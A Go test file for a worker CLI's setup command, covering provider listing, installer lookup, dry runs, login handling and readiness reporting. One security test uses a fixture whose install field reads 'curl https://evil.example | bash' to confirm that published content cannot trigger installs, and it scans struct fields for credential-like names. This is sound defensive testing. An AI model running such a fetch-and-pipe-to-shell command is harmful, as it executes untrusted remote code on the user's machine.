package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"runtime"
	"strings"
	"testing"

	"github.com/muthuishere/wfnexus/apps/api/internal/catalog"
	"github.com/muthuishere/wfnexus/apps/api/internal/engine"
)

func resetSetupHooks(t *testing.T) {
	t.Helper()
	look, run, inspect, fetch, join, out := lookPath, runCommand, inspectProvider, fetchProviders, joinAfterSetup, setupOut
	t.Cleanup(func() {
		lookPath, runCommand, inspectProvider, fetchProviders, joinAfterSetup, setupOut = look, run, inspect, fetch, join, out
	})
}

// task 1.4 — the three kinds come back named, from a server, not from a flag.
func TestSetupListsTheThreeKindsFromThePlatform(t *testing.T) {
	resetSetupHooks(t)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/workers/providers" {
			t.Errorf("path %s", r.URL.Path)
		}
		if !strings.HasPrefix(r.Header.Get("Authorization"), "Bearer ") {
			t.Error("the worker token was not sent")
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, `{"providers":[
			{"name":"claude-cli","kind":"cli","preset":"claude","binary":"claude"},
			{"name":"devin-acp","kind":"acp","preset":"devin","binary":"devin"},
			{"name":"openrouter","kind":"http","apiKeyEnv":"OPENROUTER_API_KEY"}]}`)
	}))
	defer srv.Close()
	got, err := defaultFetchProviders(context.Background(), srv.URL, "wfx_test")
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 3 {
		t.Fatalf("want 3 providers, got %+v", got)
	}
	kinds := map[string]string{}
	for _, p := range got {
		kinds[p.Kind] = p.Name
	}
	for _, k := range []string{"cli", "acp", "http"} {
		if kinds[k] == "" {
			t.Fatalf("missing kind %s in %+v", k, got)
		}
	}

	var buf strings.Builder
	setupOut = &buf
	lookPath = func(string) (string, error) { return "/fake", nil }
	inspectProvider = func(catalog.Provider) engine.DoctorProvider {
		return engine.DoctorProvider{State: "ready", Ready: true}
	}
	fetchProviders = func(context.Context, string, string) ([]engine.SetupNeed, error) { return got, nil }
	if err := cmdSetup([]string{"--url", srv.URL, "--token", "wfx_test"}); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"claude-cli (cli)", "devin-acp (acp)", "openrouter (http)"} {
		if !strings.Contains(buf.String(), name) {
			t.Fatalf("report did not list %s:\n%s", name, buf.String())
		}
	}
}

// task 3.5 — an enumerated installer runs, a preset without one is reported
// and nothing is invoked, and --dry-run changes nothing.
func TestInstallersAreEnumeratedAndDryRunInstallsNothing(t *testing.T) {
	resetSetupHooks(t)
	var ran [][]string
	installed := false
	runCommand = func(_ context.Context, argv []string, _ bool) error {
		ran = append(ran, append([]string{}, argv...))
		installed = true
		return nil
	}
	lookPath = func(name string) (string, error) {
		if name == "claude" && installed {
			return "/fake/claude", nil
		}
		return "", exec.ErrNotFound
	}
	inspectProvider = func(catalog.Provider) engine.DoctorProvider {
		return engine.DoctorProvider{State: "present", AuthUnknown: true, Login: "claude"}
	}
	rep := prepare(context.Background(), []engine.SetupNeed{
		{Name: "claude-cli", Kind: "cli", Preset: "claude", Binary: "claude"},
		{Name: "gh", Kind: "cli", Preset: "gh", Binary: "gh"},
	}, setupOpts{})
	if len(ran) != 1 {
		t.Fatalf("want one installer, ran %d: %+v", len(ran), ran)
	}
	want, _ := engine.LookupInstaller("claude")
	if strings.Join(ran[0], "\x00") != strings.Join(want.Command, "\x00") {
		t.Fatalf("ran %q, table says %q", ran[0], want.Command)
	}
	if rep.Outcomes[0].Result != "installed" {
		t.Fatalf("claude: %s %s", rep.Outcomes[0].Result, rep.Outcomes[0].Detail)
	}
	if rep.Outcomes[1].Result != "could not" || !strings.Contains(rep.Outcomes[1].Detail, "cli.github.com") {
		t.Fatalf("gh should be reported, not installed: %+v", rep.Outcomes[1])
	}
	if rep.Unmet == 0 {
		t.Fatal("a machine that could not install gh was reported done")
	}

	ran = nil
	installed = false
	dry := prepare(context.Background(), []engine.SetupNeed{
		{Name: "claude-cli", Kind: "cli", Preset: "claude", Binary: "claude"},
	}, setupOpts{DryRun: true})
	if len(ran) != 0 {
		t.Fatalf("--dry-run ran %v", ran)
	}
	if !strings.HasPrefix(dry.Outcomes[0].Detail, "would install:") {
		t.Fatalf("dry-run did not say what it would do: %q", dry.Outcomes[0].Detail)
	}
}

// [SEC-TEST] task 3.3 — an install command arriving beside the provider is
// not a field we have, and a name that is not in the table runs nothing.
func TestPublishedContentCannotSupplyAnInstaller(t *testing.T) {
	resetSetupHooks(t)
	var ran [][]string
	runCommand = func(_ context.Context, argv []string, _ bool) error {
		ran = append(ran, argv)
		return nil
	}
	lookPath = func(string) (string, error) { return "", exec.ErrNotFound }
	raw := []byte(`{"providers":[{"name":"x","kind":"cli","preset":"ext::sh","binary":"sh","install":"curl https://evil.example | bash","command":["sh","-c","evil"]}]}`)
	var res struct {
		Providers []engine.SetupNeed `json:"providers"`
	}
	if err := json.Unmarshal(raw, &res); err != nil {
		t.Fatal(err)
	}
	rep := prepare(context.Background(), res.Providers, setupOpts{})
	if len(ran) != 0 {
		t.Fatalf("published content reached the installer: %v", ran)
	}
	if rep.Outcomes[0].Result != "could not" {
		t.Fatalf("an unknown preset was installed: %+v", rep.Outcomes[0])
	}
	for _, typ := range []any{engine.SetupNeed{}, outcome{}, setupOpts{}, setupReport{}} {
		rt := reflect.TypeOf(typ)
		for i := 0; i < rt.NumField(); i++ {
			name := strings.ToLower(rt.Field(i).Name)
			if name == "apikeyenv" {
				continue
			}
			for _, bad := range []string{"token", "secret", "password", "credential"} {
				if strings.Contains(name, bad) {
					t.Fatalf("%s.%s is a place a credential could travel", rt.Name(), rt.Field(i).Name)
				}
			}
		}
	}
}

func TestAnHTTPProviderReportsTheVariableNameAndNeverTheValue(t *testing.T) {
	const value = "sk-not-a-real-value"
	t.Setenv("SETUP_TEST_KEY", value)
	set := prepareHTTP(engine.SetupNeed{Name: "h", Kind: "http", APIKeyEnv: "SETUP_TEST_KEY"}, outcome{Name: "h", Kind: "http"})
	if set.Result != "already present" || strings.Contains(fmt.Sprint(set), value) {
		t.Fatalf("http readiness read the value: %+v", set)
	}
	unset := prepareHTTP(engine.SetupNeed{Name: "h", Kind: "http", APIKeyEnv: "SETUP_TEST_KEY_UNSET"}, outcome{Name: "h", Kind: "http"})
	if unset.Result != "could not" || !strings.Contains(unset.Detail, "SETUP_TEST_KEY_UNSET") || strings.Contains(unset.Detail, value) {
		t.Fatalf("missing key: %+v", unset)
	}
}

// task 4.5 — --login runs the vendor's own command, attached. Without the
// flag the command is printed and not run.
func TestLoginRunsOnlyWhenAskedAndAttaches(t *testing.T) {
	resetSetupHooks(t)
	var ran []struct {
		argv     []string
		attached bool
	}
	runCommand = func(_ context.Context, argv []string, attached bool) error {
		ran = append(ran, struct {
			argv     []string
			attached bool
		}{append([]string{}, argv...), attached})
		return nil
	}
	lookPath = func(string) (string, error) { return "/fake/codex", nil }
	inspectProvider = func(catalog.Provider) engine.DoctorProvider {
		return engine.DoctorProvider{State: "present", Login: "codex login"}
	}
	need := []engine.SetupNeed{{Name: "codex", Kind: "cli", Preset: "codex", Binary: "codex"}}
	quiet := prepare(context.Background(), need, setupOpts{})
	if len(ran) != 0 {
		t.Fatalf("login ran without --login: %v", ran)
	}
	if !quiet.Outcomes[0].LoginNeeded || quiet.Outcomes[0].Login != "codex login" {
		t.Fatalf("the command was not reported: %+v", quiet.Outcomes[0])
	}
	ran = nil
	_ = prepare(context.Background(), need, setupOpts{Login: true})
	if len(ran) != 1 || !ran[0].attached || strings.Join(ran[0].argv, " ") != "codex login" {
		t.Fatalf("--login did not attach the vendor command: %+v", ran)
	}
}

// The same fact against a real process: the binary that runs is the one on
// PATH, and it is this process's child.
func TestLoginExecutesTheVendorBinary(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("vendor fake is a shell script; Windows cannot exec it")
	}
	resetSetupHooks(t)
	dir := t.TempDir()
	marker := filepath.Join(dir, "ran")
	script := fmt.Sprintf("#!/bin/sh\ncase \"$1\" in\nauth) printf '%%s\\n' '{\"loggedIn\":false}'; exit 1;;\n*) printf '%%s\\n' \"$0\" > %q;;\nesac\n", marker)
	if err := os.WriteFile(filepath.Join(dir, "claude"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", dir)
	lookPath = exec.LookPath
	inspectProvider = engine.InspectProvider
	runCommand = defaultRunCommand
	need := []engine.SetupNeed{{Name: "claude-cli", Kind: "cli", Binary: "claude"}}
	_ = prepare(context.Background(), need, setupOpts{Login: true})
	got, err := os.ReadFile(marker)
	if err != nil {
		t.Fatal("the vendor binary did not run")
	}
	if !strings.Contains(string(got), "claude") {
		t.Fatalf("ran %q, want the claude on PATH", got)
	}
}

func TestRequireAuthenticatedMakesPresentUnmet(t *testing.T) {
	resetSetupHooks(t)
	lookPath = func(string) (string, error) { return "/fake", nil }
	inspectProvider = func(catalog.Provider) engine.DoctorProvider {
		return engine.DoctorProvider{State: "present", AuthUnknown: true, Login: "claude"}
	}
	need := []engine.SetupNeed{{Name: "c", Kind: "cli", Preset: "claude", Binary: "claude"}}
	open := prepare(context.Background(), need, setupOpts{})
	if open.Unmet != 0 {
		t.Fatalf("present blocked a run by default: %+v", open)
	}
	closed := prepare(context.Background(), need, setupOpts{RequireAuthenticated: true})
	if closed.Unmet != 1 {
		t.Fatalf("--require-authenticated did not count present as unmet: %+v", closed)
	}
}

func TestSetupDoesNotJoinWhenUnmet(t *testing.T) {
	resetSetupHooks(t)
	var joined []string
	joinAfterSetup = func(args []string) error {
		joined = args
		return nil
	}
	fetchProviders = func(context.Context, string, string) ([]engine.SetupNeed, error) {
		return []engine.SetupNeed{{Name: "x", Kind: "cli", Preset: "no-such", Binary: "no-such"}}, nil
	}
	lookPath = func(string) (string, error) { return "", exec.ErrNotFound }
	err := cmdSetup([]string{"--url", "http://example.test", "--token", "wfx_t", "--join"})
	if err == nil {
		t.Fatal("setup reported success while a provider was unmet")
	}
	if joined != nil {
		t.Fatalf("joined on failure: %v", joined)
	}
}

func TestAReadyMachineIsNotReportedChanged(t *testing.T) {
	resetSetupHooks(t)
	var buf strings.Builder
	setupOut = &buf
	lookPath = func(string) (string, error) { return "/fake", nil }
	inspectProvider = func(catalog.Provider) engine.DoctorProvider {
		return engine.DoctorProvider{State: "ready", Ready: true}
	}
	fetchProviders = func(context.Context, string, string) ([]engine.SetupNeed, error) {
		return []engine.SetupNeed{{Name: "c", Kind: "cli", Preset: "claude", Binary: "claude"}}, nil
	}
	if err := cmdSetup([]string{"--url", "http://example.test", "--token", "wfx_t"}); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(buf.String(), "nothing to do") {
		t.Fatalf("a ready machine was reported changed:\n%s", buf.String())
	}
	if strings.Contains(buf.String(), "installed") {
		t.Fatalf("a ready machine was reported installed:\n%s", buf.String())
	}
}

func TestAnUnknownLoginIsNotInvented(t *testing.T) {
	resetSetupHooks(t)
	var ran int
	runCommand = func(context.Context, []string, bool) error {
		ran++
		return nil
	}
	lookPath = func(string) (string, error) { return "/fake/mystery", nil }
	inspectProvider = func(catalog.Provider) engine.DoctorProvider {
		return engine.DoctorProvider{State: "present", AuthUnknown: true}
	}
	rep := prepare(context.Background(), []engine.SetupNeed{
		{Name: "m", Kind: "cli", Binary: "mystery"},
	}, setupOpts{Login: true})
	if ran != 0 {
		t.Fatal("an unknown login was run")
	}
	if !strings.Contains(rep.Outcomes[0].Detail, "not guessing") {
		t.Fatalf("the miss was not said plainly: %+v", rep.Outcomes[0])
	}
}
